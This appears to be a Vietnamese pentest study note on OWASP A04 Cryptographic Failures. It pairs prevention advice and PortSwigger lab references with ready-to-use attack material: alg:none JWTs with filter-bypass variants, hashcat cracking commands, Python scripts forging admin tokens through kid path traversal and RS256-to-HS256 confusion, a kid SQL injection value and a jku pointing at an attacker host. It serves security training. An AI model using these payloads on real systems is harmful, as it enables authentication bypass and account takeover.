# A04 – Cryptographic Failures

> **OWASP Top 10:2025 · #4** — Giảm 2 hạng so với 2021 (#2 → #4), nhưng vẫn là risk có **tổng số occurrences cao nhất** trong toàn bộ Top 10 (1.6 triệu+) và mapped 32 CWEs — nhiều nhất trong danh sách. Đây là lỗ hổng liên quan đến **thiếu mã hóa, mã hóa yếu, lộ key, và lỗi quản lý cryptography** — không chỉ là "có dùng HTTPS hay chưa" mà còn về cách implement crypto đúng.

| Metric | Số liệu |
|---|---|
| CWE được map | 32 (nhiều nhất Top 10) |
| CVEs liên quan | 2,185 |
| Tổng số lần xuất hiện | 1,665,348 (cao nhất Top 10) |
| Tỉ lệ xuất hiện trung bình | 3.80% |
| Max Coverage | 100% |

Notable CWEs: **CWE-327** (Broken/Risky Crypto Algorithm), **CWE-331** (Insufficient Entropy), **CWE-1241** (Predictable Algorithm in RNG), **CWE-338** (Weak PRNG), **CWE-321** (Hard-coded Crypto Key), **CWE-347** (Improper Signature Verification).

---

## 📖 Concept

Cryptographic Failures xảy ra khi dữ liệu **đáng lẽ phải được bảo vệ bằng cryptography** lại không được bảo vệ đúng cách — hoặc **bảo vệ sai cách**.

> ⚠️ Đây KHÔNG chỉ là "có HTTPS hay không". Phần lớn lỗi thực tế nằm ở: thuật toán cũ/yếu, key bị hardcode/leak, random number không đủ entropy, IV reuse, hoặc **signature verification bị implement sai** — điều này áp dụng trực tiếp lên JWT, một trong những target phổ biến nhất của pentest hiện đại.

### Hai loại dữ liệu cần encrypt

| Layer | OSI Layer | Khi nào cần |
|---|---|---|
| **Transport layer** (data in transit) | Layer 4 | Luôn luôn — TLS ≥ 1.2 cho mọi traffic |
| **Application layer** (data at rest / extra encryption) | Layer 7 | Password, thẻ tín dụng, health record, PII, business secret |

### Checklist câu hỏi OWASP đặt ra

- Có dùng thuật toán/protocol cũ hoặc yếu (mặc định hoặc trong code cũ)?
- Default crypto key, key yếu, key reuse, hoặc thiếu key rotation?
- Crypto key bị **commit vào source code repo**?
- Encryption không được enforce (thiếu HSTS header)?
- Server certificate và trust chain có được validate đúng không?
- IV bị ignore, reuse, hoặc không đủ secure? Có dùng ECB mode không?
- Password dùng trực tiếp làm crypto key (thiếu KDF)?
- Randomness có đủ tiêu chuẩn cryptographic không? Seed có đủ entropy?
- Có dùng MD5/SHA1 cho mục đích bảo mật (không phải checksum)?
- Error message/timing có lộ thông tin (padding oracle)?
- Crypto algorithm có thể bị **downgrade hoặc bypass**?

---

## 🎯 Các dạng tấn công

### 1. Cleartext Transmission (Missing/Weak TLS) — `Critical`

```
# Site không enforce HTTPS, hoặc support cả HTTP
http://target.com/login    → credential gửi plaintext

# Attacker trên mạng không an toàn (public WiFi):
1. ARP spoofing / Evil twin AP
2. Sniff traffic → capture session cookie / credential
3. SSL stripping: downgrade HTTPS → HTTP transparent với victim
4. Replay session cookie → session hijacking
```

> 💡 Thiếu `Strict-Transport-Security` header → attacker downgrade connection dù site có HTTPS.

---

### 2. Weak Password Hashing — `Critical`

```python
# ❌ MD5 / SHA1 / SHA256 không salt — crack bằng rainbow table trong giây
password_hash = hashlib.md5(password.encode()).hexdigest()

# ❌ SHA256 có salt nhưng work factor thấp — GPU crack nhanh
password_hash = hashlib.sha256((salt + password).encode()).hexdigest()

# Attack: nếu lộ database (qua SQLi, file upload, backup leak...)
# - Unsalted hash → rainbow table lookup tức thì
# - Fast hash (MD5/SHA1/SHA256) → GPU crack hàng tỷ hash/giây
hashcat -m 0 hashes.txt rockyou.txt        # MD5
hashcat -m 1400 hashes.txt rockyou.txt     # SHA256
```

---

### 3. Hardcoded / Leaked Cryptographic Keys — `Critical`

```bash
# Secret key hardcode trong source code
SECRET_KEY = "django-insecure-x7k29dj3kf83hf"  # ← commit lên GitHub!

# JWT secret key mặc định/copy từ tutorial
JWT_SECRET = "your-256-bit-secret"  # ← default từ jwt.io!

# Tìm trong git history hoặc .env exposed (xem A02)
grep -rn "SECRET_KEY\|API_KEY\|PRIVATE_KEY" .git/

# Hard-coded encryption key trong mobile app (decompile APK)
unzip app.apk -d app/
grep -rn "AES.*key\|crypto.*secret" app/sources/
```

---

### 4. Insecure Randomness (Predictable Token) — `High`

```python
# ❌ Dùng PRNG không cryptographic cho token nhạy cảm
import random
token = ''.join(random.choices(string.ascii_letters, k=32))
# random.random() seed bằng timestamp → predictable!

# ❌ Token = hash của giá trị dễ đoán
reset_token = md5(f"{username}{timestamp}")  # timestamp brute-force được

# Attack: predictable session token / password reset token
1. Tạo nhiều account, quan sát pattern của token
2. Nếu token = f(timestamp) hoặc f(user_id) → brute-force trong khoảng thời gian hợp lý
3. Forge token cho victim → account takeover
```

---

### 5. ECB Mode / Reused IV — `High`

```
# ECB mode: cùng plaintext block → cùng ciphertext block
# Pattern trong ảnh/data vẫn nhận dạng được sau khi "encrypt"

# Ví dụ: cookie encrypt bằng AES-ECB
# Nếu user data có cấu trúc cố định (role=user padding...)
# → attacker swap block giữa các ciphertext → privilege escalation

# CBC với IV reuse / IV = 0 cố định
# → XOR hai ciphertext cùng IV để lộ thông tin về plaintext
```

---

### 6. Padding Oracle Attack — `High`

```
# CBC mode: server trả lỗi khác nhau cho "padding sai" vs "decrypt thành công"
POST /api/decrypt
Cookie: data=AAAAAAAAAAAAAAAA...

# Response A: "Invalid padding"      ← padding error
# Response B: "Invalid data format"  ← decrypt OK nhưng data sai

# Attacker dùng sự khác biệt response để decrypt từng byte
# Tool: PadBuster, hoặc Burp extension
padbuster http://target.com/decrypt <encrypted_value> 16 -encoding 0
```

---

### 7. JWT Attacks — `Critical`

JWT (JSON Web Token) gồm 3 phần: `header.payload.signature`, base64url-encoded, ngăn cách bởi dấu `.`. Vì payload **ai cũng đọc/sửa được**, security của JWT phụ thuộc hoàn toàn vào **signature verification**. Đây là nhóm tấn công cryptographic phổ biến nhất trong pentest hiện đại.

```json
// Decode payload (chỉ cần base64 decode, không cần secret)
{
  "username": "wiener",
  "isAdmin": false,
  "exp": 1683790305
}
```

#### 7.1. Accepting Arbitrary Signature (No Verification) — `Critical`

Developer nhầm `decode()` (chỉ parse, không check signature) với `verify()`.

```javascript
// ❌ jsonwebtoken (Node.js)
const data = jwt.decode(token);  // KHÔNG verify signature!

// ✅ Phải dùng:
const data = jwt.verify(token, secretKey);
```

```
Attack: đổi payload trực tiếp, giữ signature cũ (hoặc bất kỳ giá trị nào)
{"username":"wiener","isAdmin":false} → {"username":"administrator","isAdmin":true}
→ server vẫn accept vì không verify
```

#### 7.2. `alg: none` (Unsecured JWT) — `Critical`

```
# Header gốc:
{"alg":"HS256","typ":"JWT"}

# Đổi thành:
{"alg":"none","typ":"JWT"}

# Xóa toàn bộ signature (giữ dấu chấm cuối)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.

# Bypass filter bằng obfuscation nếu "none" bị block:
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
```

#### 7.3. Brute-force Secret Key (HS256) — `Critical`

HS256 dùng **symmetric key** (1 secret string cho cả sign và verify) → nếu secret yếu/default, brute-force bằng hashcat.

```bash
# Lấy JWT hợp lệ từ server, brute-force secret offline (cực nhanh, không gửi request)
hashcat -a 0 -m 16500 "<jwt_token>" jwt.secrets.list

# Nếu chạy lại, dùng --show để xem kết quả
hashcat -a 0 -m 16500 "<jwt>" jwt.secrets.list --show

# Sau khi có secret → forge token mới với payload tùy ý:
# {"username":"administrator","isAdmin":true} + ký bằng secret tìm được
```

> Wordlist phổ biến: [jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list) — chứa các secret default/copy-paste từ tutorial.

#### 7.4. JWT Header Parameter Injection — `Critical`

Header (JOSE header) chỉ bắt buộc có `alg`, nhưng thường có thêm các tham số sau — đều **user-controllable** và nói cho server biết dùng key nào để verify:

**a) `jwk` (embedded JSON Web Key)**

```json
{
  "kid": "attacker-key",
  "typ": "JWT",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA", "e": "AQAB", "kid": "attacker-key",
    "n": "<attacker_public_key_modulus>"
  }
}
```

Nếu server tin tưởng key embedded trong `jwk` mà không check whitelist → attacker tự generate key pair, sign bằng private key, embed public key vào `jwk`. Burp JWT Editor extension có sẵn attack "Embedded JWK" tự động hóa bước này.

**b) `jku` (JWK Set URL)**

```
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
```

Server fetch key set từ URL do attacker control. Nếu whitelist domain bị bypass qua URL parsing discrepancy (xem thêm SSRF whitelist bypass) → attacker host JWK Set của riêng mình.

**c) `kid` (Key ID) — Path Traversal / SQL Injection**

```json
// kid trỏ đến file trên filesystem
{"kid":"../../../../dev/null","alg":"HS256"}

// /dev/null là file rỗng → sign với secret = "" (empty string)
// → tạo token với secret rỗng, server verify bằng nội dung /dev/null (rỗng) → match!

// kid trỏ vào DB record → SQL injection
{"kid":"' UNION SELECT 'attacker_secret'--","alg":"HS256"}
```

**d) `cty` / `x5c` — Secondary injection vectors**

```
cty: "text/xml"  → nếu bypass được signature, mở vector XXE
cty: "application/x-java-serialized-object" → mở vector deserialization
x5c: embed self-signed X.509 cert chain (tương tự jwk attack, parsing X.509 phức tạp hơn)
```

#### 7.5. Algorithm Confusion (RS256 → HS256) — `Critical`

Server hỗ trợ cả **asymmetric** (RS256 — public/private key pair) và **symmetric** (HS256 — 1 secret string). Nếu code verify không check `alg` thực tế khớp với key type mong đợi → attacker đổi `alg` từ RS256 sang HS256 và **dùng public key của server làm secret HMAC**.

```
# Cơ chế:
# - RS256: verify(token, RSA_public_key) — chỉ ai có RSA_private_key mới sign được
# - HS256: verify(token, secret_string)  — ai biết secret_string đều sign được
#
# Public key của server là... PUBLIC! Nếu thư viện coi public_key như
# string secret khi verify HS256 → attacker dùng public key đó để tự ký token

# Attack flow:
1. Lấy public key của server (thường public tại /jwks.json, /.well-known/jwks.json,
   hoặc cert SSL/TLS)
2. Convert public key sang format phù hợp (PEM → hex/base64 tùy implementation)
3. Đổi header: {"alg":"RS256"} → {"alg":"HS256"}
4. Sign token bằng HMAC-SHA256, dùng public key (dạng PEM string) làm secret
5. Server verify HS256 với "secret" = public key của chính nó → match!
```

```python
# Tạo token với pyjwt
import jwt
public_key_pem = open("server_public_key.pem", "rb").read()
forged_token = jwt.encode(
    {"username": "administrator", "isAdmin": True},
    key=public_key_pem,
    algorithm="HS256"
)
```

---

### ⚠️ Hai dạng hay bị bỏ sót

**Caching sensitive responses** — Response chứa token, password reset link, hoặc PII bị cache ở CDN/proxy/browser. `Cache-Control: no-store` thiếu → dữ liệu nhạy cảm lưu lại trên shared cache, user khác có thể thấy.

**Reversible "hashing"** — Dùng `base64`, `XOR`, hoặc encoding thay vì hashing thật cho password. Encoding **luôn reversible** — không phải mã hóa một chiều.

```python
# ❌ Đây KHÔNG phải hashing, chỉ là encoding — decode được ngay
stored_password = base64.b64encode(password.encode())

# Attacker chỉ cần:
base64.b64decode(stored_password)  # → plaintext password!
```

---

## 🔍 Dấu hiệu nhận biết

| Mức độ | Dấu hiệu | Cần làm |
|---|---|---|
| 🔴 High | JWT có `alg` field trong header | Thử đổi `alg: none`, brute-force HS256 secret |
| 🔴 High | Server hỗ trợ cả RS256 và HS256 | Test algorithm confusion: RS256 → HS256 với public key |
| 🔴 High | JWT header có `jwk`, `jku`, hoặc `kid` | Test embedded JWK, jku SSRF, kid path traversal/SQLi |
| 🔴 High | Mixed HTTP/HTTPS, thiếu HSTS | Test SSL stripping, check `Strict-Transport-Security` header |
| 🔴 High | Password hash trông giống MD5 (32 hex char) / SHA1 (40 hex char) | Crack bằng hashcat + rockyou |
| 🟡 Med | Token/reset-link có pattern dự đoán được (timestamp, counter) | Generate nhiều token, phân tích entropy |
| 🟡 Med | Response decrypt trả lỗi khác nhau (padding vs format) | Test padding oracle với PadBuster |
| 🟡 Med | Cookie/data trông giống AES-ECB (block pattern lặp) | Phân tích ciphertext block 16-byte có lặp không |
| 🔵 Low | Crypto key/secret xuất hiện trong JS source, mobile app, .env | grep source code, decompile APK |
| 🔵 Low | Response chứa sensitive data nhưng không có `Cache-Control: no-store` | Check header, test cache trên proxy |

---

## 🧠 Attack Flow – Methodology

### JWT Testing (toàn diện)

```
1. Decode JWT (jwt.io hoặc Burp JWT tab)
   └─ Header: check "alg", "jwk", "jku", "kid", "cty", "x5c"
   └─ Payload: tìm field ảnh hưởng auth/role (isAdmin, role, username, sub)

2. Test signature verification cơ bản
   └─ Đổi 1 byte trong payload, giữ nguyên signature → server reject không?
   └─ Nếu accept → "accepting arbitrary signature" confirmed

3. Test alg: none
   └─ {"alg":"none"} + xóa signature (giữ trailing dot)
   └─ Thử case variation nếu bị filter: "None", "NONE", "nOnE"

4. Brute-force secret (nếu HS256)
   └─ hashcat -a 0 -m 16500 "<jwt>" jwt.secrets.list
   └─ Nếu crack được → forge token tùy ý

5. Test algorithm confusion (nếu server có endpoint RS256/JWKS)
   └─ Lấy public key từ /.well-known/jwks.json hoặc cert
   └─ Đổi alg RS256 → HS256, sign bằng public key
   └─ Gửi token, quan sát có accept không

6. Test header injection
   └─ jwk: thêm key tự generate, dùng Burp "Embedded JWK"
   └─ jku: trỏ về JWK Set tự host, test whitelist bypass
   └─ kid: thử path traversal (../../dev/null), SQL injection (')

7. Check best practice
   └─ Có "exp" claim không? Token có expire không?
   └─ Có "aud" claim không? Token dùng được trên site khác không?
   └─ Logout có thực sự invalidate token không?
```

### Weak Crypto / Randomness Testing

```
1. Identify token generation logic
   └─ Session token, password reset token, API key, CSRF token

2. Collect nhiều token mẫu (tạo nhiều account/request)
   └─ Phân tích pattern: length, charset, có dependency vào timestamp?

3. Test entropy
   └─ So sánh token gần thời điểm nhau → có giống nhau một phần không?
   └─ Tool: Burp Sequencer (phân tích entropy session token)

4. Nếu token = hash(predictable_input)
   └─ Brute-force input space (timestamp ±few seconds, user_id range)
   └─ Tạo lại hash, so khớp với token thật

5. Test TLS/transport
   └─ testssl.sh / sslyze → check protocol version, cipher suite
   └─ Check HSTS, certificate validation, mixed content
```

---

## 💣 Payloads

### JWT – alg: none

```
# Header gốc (decode base64url)
{"alg":"HS256","typ":"JWT"}

# Header mới
{"alg":"none","typ":"JWT"}

# Encode lại header + payload, signature để trống (giữ trailing dot)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJpc0FkbWluIjp0cnVlfQ.

# Bypass filter
{"alg":"None"}
{"alg":"nOnE"}
{"alg":" none"}
```

### JWT – Brute-force secret

```bash
# Hashcat mode 16500 = JWT (HS256/384/512)
hashcat -a 0 -m 16500 "eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo" jwt.secrets.list

hashcat -a 0 -m 16500 "<jwt>" jwt.secrets.list --show
```

### JWT – kid Path Traversal

```json
// kid trỏ tới /dev/null (file rỗng trên Linux) → secret = "" (empty)
{
  "kid": "../../../../../../dev/null",
  "alg": "HS256",
  "typ": "JWT"
}
// Sign token với secret = "" (empty string)
```

```python
import jwt
forged = jwt.encode(
    {"username": "administrator", "isAdmin": True},
    key="",  # empty secret
    algorithm="HS256",
    headers={"kid": "../../../../../../dev/null"}
)
```

### JWT – Algorithm Confusion (RS256 → HS256)

```python
import jwt

# Public key dạng PEM lấy từ server (jwks.json hoặc cert)
public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

forged_token = jwt.encode(
    {"username": "administrator", "isAdmin": True, "exp": 9999999999},
    key=public_key_pem,
    algorithm="HS256"
)
print(forged_token)
```

### JWT – Embedded JWK (Burp JWT Editor)

```
1. JWT Editor Keys tab → New RSA Key → Generate

2. Repeater → JSON Web Token tab → modify payload
   {"username":"administrator","isAdmin":true}

3. Click "Attack" → "Embedded JWK" → chọn RSA key vừa tạo
   (Burp tự thêm "jwk" header + sign bằng private key + sửa "kid" cho khớp)

4. Send → server verify bằng public key embedded trong token (do attacker control)
```

### Weak Hash Cracking

```bash
# MD5
hashcat -a 0 -m 0 hashes.txt rockyou.txt

# SHA1
hashcat -a 0 -m 100 hashes.txt rockyou.txt

# SHA256 (unsalted)
hashcat -a 0 -m 1400 hashes.txt rockyou.txt

# SHA256 with salt (format: hash:salt)
hashcat -a 0 -m 1410 hashes.txt rockyou.txt
```

### Padding Oracle (CBC)

```bash
# PadBuster: decrypt ciphertext qua padding oracle
padbuster http://target.com/page \
  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
  16 \
  -cookies "auth=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# 16 = block size (AES = 16 bytes)
# Output: plaintext decrypt từng byte qua oracle response timing/error
```

### TLS / Transport Check

```bash
# testssl.sh: full TLS audit
testssl.sh https://target.com

# sslyze: scan cipher, protocol version
sslyze --regular target.com

# Check HSTS header
curl -I https://target.com | grep -i strict-transport
```

---

## 🛡️ Prevention

### Nguyên tắc: Don't roll your own crypto

> Luôn dùng **thư viện crypto đã được audit kỹ** (libsodium, BCrypt, Argon2 implementations chuẩn). Không tự viết thuật toán mã hóa, không tự generate random number bằng `Math.random()` hoặc `rand()` cho mục đích security.

### Checklist cho developer

- [ ] **Classify data** — xác định data nào nhạy cảm (PII, password, payment) theo GDPR/PCI DSS
- [ ] **TLS ≥ 1.2** cho mọi traffic, drop CBC ciphers, enable forward secrecy, enable **HSTS**
- [ ] **Hash password** bằng **Argon2, scrypt, hoặc PBKDF2-HMAC-SHA512** — không MD5/SHA1/SHA256 trần
- [ ] **Salt unique** cho mỗi password — không reuse salt
- [ ] **Authenticated encryption** (AES-GCM) thay vì encryption thuần (AES-CBC không HMAC)
- [ ] **CSPRNG** cho mọi token nhạy cảm: session, reset password, API key, CSRF token
- [ ] **Không hardcode key** trong source — dùng env var hoặc secret manager / HSM
- [ ] **JWT**: dùng thư viện up-to-date, luôn `verify()` không `decode()`, set `exp` và `aud`
- [ ] **Disable caching** cho response chứa sensitive data (`Cache-Control: no-store`)
- [ ] Chuẩn bị **Post-Quantum Cryptography** — theo lộ trình ENISA, deadline cuối 2030 cho hệ thống high-risk

### Fix Password Hashing

```python
# ❌ MD5/SHA1/SHA256 trần
hashlib.sha256(password.encode()).hexdigest()

# ✅ Argon2 (recommended 2025)
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash(password)
ph.verify(hash, password)

# ✅ bcrypt (legacy nhưng vẫn ổn)
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
bcrypt.checkpw(password.encode(), hashed)
```

### Fix JWT Implementation

```javascript
// ❌ decode() không verify
const payload = jwt.decode(token);

// ✅ verify() với algorithm whitelist rõ ràng
const payload = jwt.verify(token, secretKey, {
  algorithms: ['HS256'],  // CHỈ định rõ — chặn algorithm confusion
  audience: 'myapp.com',  // check aud claim
  issuer: 'myapp-auth'
});

// ✅ jku whitelist
const ALLOWED_JKU = ['https://myapp.com/.well-known/jwks.json'];
if (!ALLOWED_JKU.includes(token.header.jku)) {
  throw new Error('Untrusted jku');
}

// ✅ Không bao giờ trust "alg" từ token để chọn verify method
// Luôn fix cứng algorithm phía server, KHÔNG đọc từ header
```

### Fix Randomness

```python
# ❌ Không dùng cho security
import random
token = str(random.random())

# ✅ CSPRNG
import secrets
token = secrets.token_urlsafe(32)
```

```javascript
// ❌ Math.random()
const token = Math.random().toString(36);

// ✅ crypto.randomBytes
const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('hex');
```

### Fix Encryption Mode

```python
# ❌ AES-ECB hoặc AES-CBC không HMAC
cipher = AES.new(key, AES.MODE_ECB)

# ✅ AES-GCM (authenticated encryption — built-in integrity check)
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_GCM)
ciphertext, tag = cipher.encrypt_and_digest(plaintext)
# tag dùng để verify integrity khi decrypt — chống padding oracle
```

### HSTS Header

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

---

## 🧪 Labs – PortSwigger Web Security Academy

### JWT Attacks

| Lab | Level | Kỹ thuật |
|---|---|---|
| [JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt) | 🟡 Apprentice | Server dùng `decode()` thay `verify()` — sửa payload trực tiếp |
| [JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt) | 🟡 Apprentice | `alg: none` — bypass signature hoàn toàn |
| [JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt) | 🔴 Practitioner | Brute-force HS256 secret bằng hashcat + jwt.secrets.list |
| [JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt) | 🔴 Practitioner | Embedded JWK — self-signed key, Burp "Attack → Embedded JWK" |
| [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt) | 🔴 Practitioner | Host JWK Set riêng, trỏ `jku` về exploit server |
| [JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt) | 🔴 Practitioner | `kid: ../../../dev/null` → sign với secret rỗng |
| [JWT algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion) | 🔴 Practitioner | RS256 → HS256, dùng public key server làm HMAC secret |
| [JWT algorithm confusion attack via jwk header](https://portswigger.net/web-security/jwt/algorithm-confusion) | ⭐ Expert | Kết hợp algorithm confusion + jwk header injection |

> Toàn bộ labs tại: [All JWT labs](https://portswigger.net/web-security/all-labs#jwt)

### Liên quan – Authentication / Crypto-adjacent

| Lab | Level | Kỹ thuật |
|---|---|---|
| [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms) | 🟡 Apprentice | Reset token dự đoán được hoặc không verify ownership |
| [Username enumeration via subtle response differences](https://portswigger.net/web-security/authentication/other-mechanisms) | 🔴 Practitioner | Timing/response side-channel — liên quan padding oracle concept |

---

## 🔧 Tools

| Tool | Mục đích |
|---|---|
| **jwt.io** | Decode/encode/verify JWT trực quan |
| **Burp JWT Editor extension** | Edit, resign, attack JWT (Embedded JWK, alg confusion) tự động |
| **hashcat** | Crack hash (password) và brute-force JWT secret (mode 16500) |
| **jwt_tool** | CLI tool chuyên test JWT vulnerabilities (alg none, kid injection, ...) |
| **PadBuster** | Khai thác padding oracle attack trên CBC |
| **testssl.sh** | Audit toàn diện TLS config (protocol, cipher, cert) |
| **sslyze** | Scan TLS/SSL config nhanh |
| **Burp Sequencer** | Phân tích entropy của session token/random value |
| **CyberChef** | Decode/encode/hash/crypto operations đa năng |
| **John the Ripper** | Crack hash, hỗ trợ nhiều format |

---

## 🌍 Real-world Cases

**Case 1 – JWT alg:none trong production API**

Một fintech API dùng JWT cho session, nhưng thư viện cho phép `alg: none` mà không validate whitelist algorithm. Pentester gửi token với header `{"alg":"none"}` và payload `{"role":"admin"}`, xóa signature — server accept và trả về data admin. Root cause: thư viện JWT version cũ, code không enforce algorithm whitelist.

**Case 2 – Algorithm Confusion trong SSO**

Hệ thống SSO publish public key tại `/.well-known/jwks.json` để client verify token RS256. Server backend verify token bằng cùng một hàm cho cả RS256 và HS256 mà không check `alg` khớp key type. Attacker lấy public key, đổi `alg` thành HS256, sign bằng public key (dùng làm HMAC secret) → forge token admin hợp lệ trên toàn hệ thống SSO.

**Case 3 – Hardcoded JWT secret từ tutorial**

Startup copy code mẫu từ blog hướng dẫn JWT, quên đổi `JWT_SECRET = "your-256-bit-secret"`. Secret này nằm trong [jwt.secrets.list](https://github.com/wallarm/jwt-secrets) — wordlist công khai. Hashcat crack secret trong < 1 giây, attacker forge token cho bất kỳ user nào.

**Case 4 – Adobe (2013): 153 triệu password bị crack**

Adobe dùng **3DES encryption** (không phải hashing) cho password, cùng một key cho toàn bộ database, và lưu password hint dưới dạng plaintext bên cạnh. Vì cùng plaintext → cùng ciphertext (ECB-like behavior), researcher có thể group các account dùng password giống nhau và dùng hint để suy ra password gốc — mà không cần "crack" theo nghĩa truyền thống.

**Case 5 – LinkedIn (2012): SHA1 không salt**

134 triệu password hash bị leak, lưu dưới dạng SHA1 không salt. Vì SHA1 là fast hash và không có salt, >90% hash bị crack trong vài ngày bằng rainbow table + GPU brute-force.

---

## 💡 Attacker Mindset

> **"Mỗi khi thấy JWT: thử alg:none trước, brute-force secret sau, rồi mới đến algorithm confusion."**

Thứ tự ưu tiên vì độ dễ: `alg:none` chỉ cần sửa text, brute-force cần wordlist + hashcat (giây), algorithm confusion cần tìm public key và hiểu cấu trúc PEM. Cả 3 đều đáng thử trên mọi JWT-based auth.

> **"Hash trông có vẻ random không có nghĩa là crypto-secure."**

MD5 và SHA256 đều tạo output trông "random" — nhưng đều là fast hash, dễ bị GPU brute-force. Phân biệt giữa "hash để checksum" và "hash để bảo vệ password" là khác biệt sống còn.

> **"Public key publicly available — nhưng 'public' không có nghĩa là 'an toàn để dùng làm bất cứ thứ gì'."**

Algorithm confusion là minh chứng: cùng một giá trị (public key) an toàn trong context RS256 (asymmetric) nhưng trở thành backdoor trong context HS256 (symmetric) nếu code không phân biệt rõ.

> **"Token = f(input dễ đoán) luôn đáng để thử brute-force."**

Nếu reset token, session ID, hay API key được sinh ra từ timestamp, user ID, hoặc counter — kể cả khi đã hash — không gian giá trị thường nhỏ hơn nhiều so với CSPRNG 256-bit thật.

---

## ✅ Quick Pentest Checklist

- [ ] Decode JWT — check `alg`, `jwk`, `jku`, `kid`, `cty`, `x5c` trong header
- [ ] Test `alg: none` — xóa signature, giữ trailing dot
- [ ] Brute-force HS256 secret bằng hashcat + jwt.secrets.list
- [ ] Nếu server hỗ trợ RS256 — test algorithm confusion (RS256 → HS256 với public key)
- [ ] Test `jwk` header injection bằng Burp Embedded JWK attack
- [ ] Test `kid` path traversal (`../../dev/null`) và SQL injection
- [ ] Check token có `exp`, `aud` claim không — token có expire/revoke được không?
- [ ] Check HTTP vs HTTPS — có HSTS header không?
- [ ] Nếu lộ password hash — xác định loại hash (MD5/SHA1/bcrypt/Argon2) và thử crack
- [ ] Test password reset token — có dự đoán được không (timestamp-based)?
- [ ] Check response sensitive có `Cache-Control: no-store` không
- [ ] Nếu thấy CBC mode + error message khác nhau → test padding oracle

---

*Nguồn: [OWASP Top 10:2025 – A04](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/) · [PortSwigger – JWT Attacks](https://portswigger.net/web-security/jwt) · [PortSwigger – JWT Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion) · [jwt.secrets.list](https://github.com/wallarm/jwt-secrets)*
